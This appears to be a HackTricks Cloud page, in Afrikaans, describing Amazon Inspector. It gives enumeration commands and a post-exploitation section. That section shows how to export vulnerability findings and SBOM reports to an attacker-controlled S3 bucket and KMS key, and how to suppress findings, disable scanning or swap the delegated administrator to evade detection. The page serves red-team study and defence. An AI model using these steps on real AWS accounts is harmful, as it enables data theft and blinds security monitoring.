# AWS - Inspector Enum

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Inspector

Amazon Inspector is 'n gevorderde, outomatiese kwetsbaarheidsbestuurdensdiens wat ontwerp is om die sekuriteit van jou AWS-omgewing te verbeter. Hierdie diens skandeer voortdurend Amazon EC2-instanies, houerbeeld in Amazon ECR, Amazon ECS, en AWS Lambda-funksies vir kwetsbaarhede en onbedoelde netwerk blootstelling. Deur 'n robuuste kwetsbaarheidsintelligensiedatabasis te benut, verskaf Amazon Inspector gedetailleerde bevindinge, insluitend ernstigheidsvlakke en aanbevelings vir herstel, wat organisasies help om sekuriteitsrisiko's proaktief te identifiseer en aan te spreek. Hierdie omvattende benadering verseker 'n versterkte sekuriteitspostuur regoor verskeie AWS-diens, wat bydra tot nakoming en risikobestuur.

## Sleutelelemente

### Bevindinge

Bevindinge in Amazon Inspector is gedetailleerde verslae oor kwetsbaarhede en blootstellings wat tydens die skandering van EC2-instanies, ECR-opslagplekke, of Lambda-funksies ontdek is. Gebaseer op sy toestand, word bevindinge gekategoriseer as:

- **Aktief**: Die bevinding is nog nie herstel nie.
- **Gesluit**: Die bevinding is herstel.
- **Onderdruk**: Die bevinding is met hierdie toestand gemerk weens een of meer **onderdrukkingsreëls**.

Bevindinge word ook in die volgende drie tipes gekategoriseer:

- **Pakket**: Hierdie bevindinge het betrekking op kwetsbaarhede in sagtewarepakkette wat op jou bronne geïnstalleer is. Voorbeelde sluit verouderde biblioteke of afhanklikhede met bekende sekuriteitsprobleme in.
- **Kode**: Hierdie kategorie sluit kwetsbaarhede in wat in die kode van programme wat op jou AWS-bronne loop, gevind is. Algemene probleme is kodefoute of onveilige praktyke wat tot sekuriteitskendings kan lei.
- **Netwerk**: Netwerkbevindinge identifiseer potensiële blootstellings in netwerkkonfigurasies wat deur aanvallers benut kan word. Dit sluit oop poorte, onveilige netwerkprotokolle, en verkeerd gekonfigureerde sekuriteitsgroepe in.

### Filters en Onderdrukkingsreëls

Filters en onderdrukkingsreëls in Amazon Inspector help om bevindinge te bestuur en te prioritiseer. Filters stel jou in staat om bevindinge te verfyn op grond van spesifieke kriteria, soos ernstigheid of brontipe. Onderdrukkingsreëls stel jou in staat om sekere bevindinge te onderdruk wat as lae risiko beskou word, reeds gemitigeer is, of om enige ander belangrike rede, om te voorkom dat dit jou sekuriteitsverslae oorlaai en jou in staat stel om op meer kritieke kwessies te fokus.

### Sagteware Bill of Materials (SBOM)

'n Sagteware Bill of Materials (SBOM) in Amazon Inspector is 'n uitvoerbare geneste inventarislys wat al die komponente binne 'n sagtewarepakkie, insluitend biblioteke en afhanklikhede, beskryf. SBOMs help om deursigtigheid in die sagtewarevoorsieningsketting te verskaf, wat beter kwetsbaarheidsbestuur en nakoming moontlik maak. Dit is noodsaaklik om risiko's wat verband hou met oopbron- en derdeparty-sagtewarekomponente te identifiseer en te mitigeer.

## Sleutelkenmerke

### Voer bevindinge uit

Amazon Inspector bied die vermoë om bevindinge na Amazon S3-emmers, Amazon EventBridge en AWS Security Hub uit te voer, wat jou in staat stel om gedetailleerde verslae van geïdentifiseerde kwetsbaarhede en blootstellings vir verdere analise of deling op 'n spesifieke datum en tyd te genereer. Hierdie kenmerk ondersteun verskeie uitvoerformate soos CSV en JSON, wat dit makliker maak om met ander gereedskap en stelsels te integreer. Die uitvoerfunksionaliteit maak aanpassing van die data wat in die verslae ingesluit is, moontlik, sodat jy bevindinge kan filter op spesifieke kriteria soos ernstigheid, brontipe, of datumbereik en standaard al jou bevindinge in die huidige AWS-streek met 'n Aktiewe status insluit.

Wanneer bevindinge uitgevoer word, is 'n Sleutelbestuursdiens (KMS) sleutel nodig om die data tydens die uitvoer te enkripteer. KMS-sleutels verseker dat die uitgevoerde bevindinge teen ongemagtigde toegang beskerm word, wat 'n ekstra laag sekuriteit vir sensitiewe kwetsbaarheidsinligting bied.

### Amazon EC2-instanies skandering

Amazon Inspector bied robuuste skanderingsvermoë vir Amazon EC2-instanies om kwetsbaarhede en sekuriteitskwessies op te spoor. Inspector vergelyk die geëkstraeerde metadata van die EC2-instant teen reëls van sekuriteitsadvieë om pakketskwetsbaarhede en netwerktoeganklikheidskwessies te produseer. Hierdie skanderings kan deur **agentgebaseerde** of **agentlose** metodes uitgevoer word, afhangende van die **skanderingsmodus**-instellingskonfigurasie van jou rekening.

- **Agentgebaseerd**: Benut die AWS Systems Manager (SSM) agent om diep skanderings uit te voer. Hierdie metode maak omvattende data-insameling en -analise direk vanaf die instansie moontlik.
- **Agentloos**: Bied 'n ligte alternatief wat nie die installering van 'n agent op die instansie vereis nie, skep 'n EBS-snapshot van elke volume van die EC2-instant, soek na kwetsbaarhede, en verwyder dit dan; benut bestaande AWS-infrastruktuur vir skandering.

Die skanderingsmodus bepaal watter metode gebruik sal word om EC2-skanderings uit te voer:

- **Agentgebaseerd**: Behels die installering van die SSM-agent op EC2-instanies vir diep inspeksie.
- **Hibriede Skandering**: Kombineer beide agentgebaseerde en agentlose metodes om dekking te maksimeer en prestasie-impak te minimaliseer. In daardie EC2-instanies waar die SSM-agent geïnstalleer is, sal Inspector 'n agentgebaseerde skandering uitvoer, en vir daardie waar daar geen SSM-agent is nie, sal die skandering agentloos wees.

'n Ander belangrike kenmerk is die **diep inspeksie** vir EC2 Linux-instanies. Hierdie kenmerk bied deeglike analise van die sagteware en konfigurasie van EC2 Linux-instanies, wat gedetailleerde kwetsbaarheidsevaluerings insluit, insluitend bedryfstelselkwetsbaarhede, toepassingskwetsbaarhede, en verkeerde konfigurasies, wat 'n omvattende sekuriteitsevaluasie verseker. Dit word bereik deur die inspeksie van **aangepaste paaie** en al sy subgids. Standaard sal Amazon Inspector die volgende skandeer, maar elke lidrekening kan tot 5 meer aangepaste paaie definieer, en elke gedelegeerde administrateur tot 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Amazon ECR-houerbeeldskandering

Amazon Inspector bied robuuste skanderingsvermoë vir Amazon Elastic Container Registry (ECR) houerbeeld, wat verseker dat pakketskwetsbaarhede effektief opgespoor en bestuur word.

- **Basiese Skandering**: Dit is 'n vinnige en ligte skandering wat bekende OS-pakketskwetsbaarhede in houerbeelde identifiseer deur 'n standaardstel reëls van die oopbron Clair-projek te gebruik. Met hierdie skanderingskonfigurasie sal jou opslagplekke geskandeer word met duw, of handmatige skanderings uitvoer.
- **Verbeterde Skandering**: Hierdie opsie voeg die deurlopende skanderingseienskap by bo-op die duwskandering. Verbeterde skandering duik dieper in die lae van elke houerbeeld om kwetsbaarhede in OS-pakkette en in programmeer tale pakkette met hoër akkuraatheid te identifiseer. Dit analiseer beide die basisbeeld en enige bykomende lae, wat 'n omvattende uitsig van potensiële sekuriteitskwessies bied.

### Amazon Lambda-funksies skandering

Amazon Inspector sluit omvattende skanderingsvermoë vir AWS Lambda-funksies en sy lae in, wat die sekuriteit en integriteit van bedienerlose toepassings verseker. Inspector bied twee tipes skandering vir Lambda-funksies:

- **Lambda standaard skandering**: Hierdie verstekfunksie identifiseer sagtewarekwetsbaarhede in die toepassingspakketafhanklikhede wat by jou Lambda-funksie en lae gevoeg is. Byvoorbeeld, as jou funksie 'n weergawe van 'n biblioteek soos python-jwt met 'n bekende kwetsbaarheid gebruik, genereer dit 'n bevinding.
- **Lambda-kodeskandering**: Analiseer aangepaste toepassingskode vir sekuriteitskwessies, identifiseer kwetsbaarhede soos inspuitingsfoute, datalekke, swak kriptografie, en ontbrekende enkripsie. Dit vang kodesnitte wat opgespoorde kwetsbaarhede beklemtoon, soos hardgekoppelde geloofsbriewe. Bevindinge sluit gedetailleerde herstelingsvoorstelle en kodesnitte vir die regstelling van die kwessies in.
### **Sentrum vir Internet-sekuriteit (CIS) skanderings**

Amazon Inspector sluit CIS-skanderings in om Amazon EC2-instandhoudingsisteem-operasiestelsels teen die beste praktykaanbevelings van die Sentrum vir Internet-sekuriteit (CIS) te toets. Hierdie skanderings verseker dat konfigurasies voldoen aan die standaard-sekuriteitsbasislyne van die bedryf.

- **Konfigurasie**: CIS-skanderings evalueer of stelselkonfigurasies spesifieke CIS-basislyn-aanbevelings nakom, met elke toets wat gekoppel is aan 'n CIS-toets-ID en titel.
- **Uitvoering**: Skanderings word uitgevoer of geskeduleer op grond van instansietags en gedefinieerde skedules.
- **Resultate**: Na-skanderingresultate dui aan watter toetse geslaag, oorgeslaan, of misluk het, wat insig bied in die sekuriteitspostuur van elke instansie.

## Enumerasie
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Na-Exploitasi

{% hint style="success" %}
Vanuit 'n aanvaller se perspektief kan hierdie diens die aanvaller help om kwesbaarhede en netwerk blootstellings te vind wat hom kan help om ander instansies/houers te kompromiteer.

Nietemin kan 'n aanvaller ook belangstel daarin om hierdie diens te ontwrig sodat die slagoffer nie kwesbaarhede (al of spesifieke eenhede) kan sien nie.
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

'n Aanvaller kan gedetailleerde verslae van kwesbaarhede of sagteware faktuur van materiale (SBOMs) genereer en hulle uit jou AWS-omgewing eksfiltreer. Hierdie inligting kan uitgebuit word om spesifieke swakhede, verouderde sagteware, of onveilige afhanklikhede te identifiseer, wat doelgerigte aanvalle moontlik maak.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
Die volgende voorbeeld toon hoe om alle aktiewe bevindinge van Amazon Inspector na 'n aanvaller beheerde Amazon S3-emmer met 'n aanvaller beheerde Amazon KMS-sleutel te eksfiltreer:

1. **Skep 'n Amazon S3-emmer** en heg 'n beleid daaraan om dit toeganklik te maak vanaf die slagoffer Amazon Inspector:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Skep 'n Amazon KMS-sleutel** en heg 'n beleid daaraan om dit bruikbaar te maak deur die slagoffer se Amazon Inspector:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Voer die bevel uit om die bevindingsverslag te **skep** en dit te eksfileer:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potensiële Impak**: Generering en uitlek van gedetailleerde kwesbaarheid- en sagtewareverslae, wat insig bied in spesifieke kwesbaarhede en sekuriteitswaktes.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

'n Aanvaller kan die generering van die gespesifiseerde verslag van bevindinge of SBOM-verslag kanselleer, wat voorkom dat sekuriteitsspanne tydige inligting oor kwesbaarhede en sagteware bill of materials (SBOMs) ontvang, wat die opsporing en regmaak van sekuriteitskwessies vertraag.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potensiële Impak**: Versteuring van sekuriteitsmonitering en voorkoming van tydige opsporing en regstelling van sekuriteitskwessies.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

'n Aanvaller met hierdie regte sal in staat wees om die filterreëls te manipuleer wat bepaal watter kwesbaarhede en sekuriteitskwessies gerapporteer of onderdruk word (as die **aksie** ingestel is op SUPPRESS, sal 'n onderdrukkingreël geskep word). Dit kan kritieke kwesbaarhede verberg vir sekuriteitsadministrateurs, wat dit makliker maak om hierdie swakhede te benut sonder opsporing. Deur belangrike filters te verander of te verwyder, kan 'n aanvaller ook geraas skep deur die stelsel te oorstroom met irrelevante bevindinge, wat doeltreffende sekuriteitsmonitering en reaksie belemmer.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potensiële Impak**: Verhulling of onderdrukking van kritieke kwetsbaarhede, of die oorlaai van die stelsel met irrelevante bevindinge.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

'n Aanvaller kan die veiligheidsbestuursstruktuur aansienlik ontwrig.

- Deur die gedelegeerde admin-rekening te deaktiveer, kan die aanvaller voorkom dat die veiligheidspan toegang kry tot en Amazon Inspector-instellings en verslae bestuur.
- Die aktivering van 'n ongemagtigde admin-rekening sal 'n aanvaller in staat stel om veiligheidskonfigurasies te beheer, moontlik skandeerders te deaktiveer of instellings te wysig om skadelike aktiwiteite te verberg.

{% hint style="warning" %}

Dit is nodig dat die ongemagtigde rekening in dieselfde Organisasie as die slagoffer moet wees om die gedelegeerde administrateur te word.

Dit is ook nodig dat nadat die wettige gedelegeerde administrateur gedeaktiveer is, en voordat die ongemagtigde rekening as die gedelegeerde administrateur geaktiveer word, die wettige administrateur gederegistreer moet word as die gedelegeerde administrateur van die organisasie. Dit kan gedoen word met die volgende bevel (**`organizations:DeregisterDelegatedAdministrator`** toestemming vereis): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potensiële Impak**: Versteuring van die sekuriteitsbestuur.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

'n Aanvaller kan die assosiasie van lidrekeninge binne 'n Amazon Inspector-organisasie manipuleer. Deur ongemagtigde rekeninge te assosieer of wettige rekeninge te desassosieer, kan 'n aanvaller beheer oor watter rekeninge ingesluit word in sekuriteitsken en -verslagdoening. Dit kan daartoe lei dat kritieke rekeninge uitgesluit word van sekuriteitsmonitering, wat die aanvaller in staat stel om kwesbaarhede in daardie rekeninge te benut sonder opsporing.

{% hint style="warning" %}

Hierdie aksie moet uitgevoer word deur die gedelegeerde administrateur.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Potensiële Impak**: Uitsluiting van sleutelrekeninge van sekuriteitskenningstelsels, wat onopgespoorde uitbuiting van kwesbaarhede moontlik maak.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

'n Aanvaller met die `inspector2:Disable` toestemming sou in staat wees om sekuriteitskenningstelsels op spesifieke hulpbron tipes (EC2, ECR, Lambda, Lambda-kode) oor die gespesifiseerde rekeninge te deaktiveer, wat dele van die AWS-omgewing ongemerk en vatbaar vir aanvalle sou laat. Daarbenewens, met die **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`** toestemmings, sou 'n aanvaller dan skandeerders selektief weer kan aktiveer om opsporing van verdagte konfigurasies te vermy.

{% hint style="warning" %}
Hierdie aksie vereis dat dit deur die gedelegeerde administrateur uitgevoer word.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potensiële Impak**: Skep van blinde kolle in die sekuriteitsmonitering.

### `inspector2:UpdateOrganizationConfiguration`

'n Aanvaller met hierdie toestemming sal in staat wees om die konfigurasies vir jou Amazon Inspector-organisasie by te werk, wat die verstek skanderingseienskappe wat vir nuwe lidrekeninge geaktiveer is, sal beïnvloed.

{% hint style="warning" %}

Hierdie aksie vereis dat dit uitgevoer word deur die gedelegeerde administrateur.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potensiële Impak**: Verander sekuriteitskanderingbeleid en -konfigurasies vir die organisasie.

### `inspector2:TagResource`, `inspector2:UntagResource`

'n Aanvaller kan etikette op AWS Inspector-bronne manipuleer, wat krities is vir die organiseer, opspoor en outomatiseer van sekuriteitsassesserings. Deur etikette te verander of te verwyder, kan 'n aanvaller potensieel kwesbaarhede verberg vir sekuriteitskane, nakomingverslae ontwrig, en inmeng met outomatiese herstelprosesse, wat kan lei tot ongekontroleerde sekuriteitskwessies en gekompromitteerde stelselintegriteit.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potensiële Impak**: Versteekte kwesbaarhede, ontwrigting van nakomingsverslagdoening, ontwrigting van sekuriteitsoutomatisering en ontwrigting van koste-toewysing.

# Verwysings
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


{% hint style="success" %}
Leer & oefen AWS Hack: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
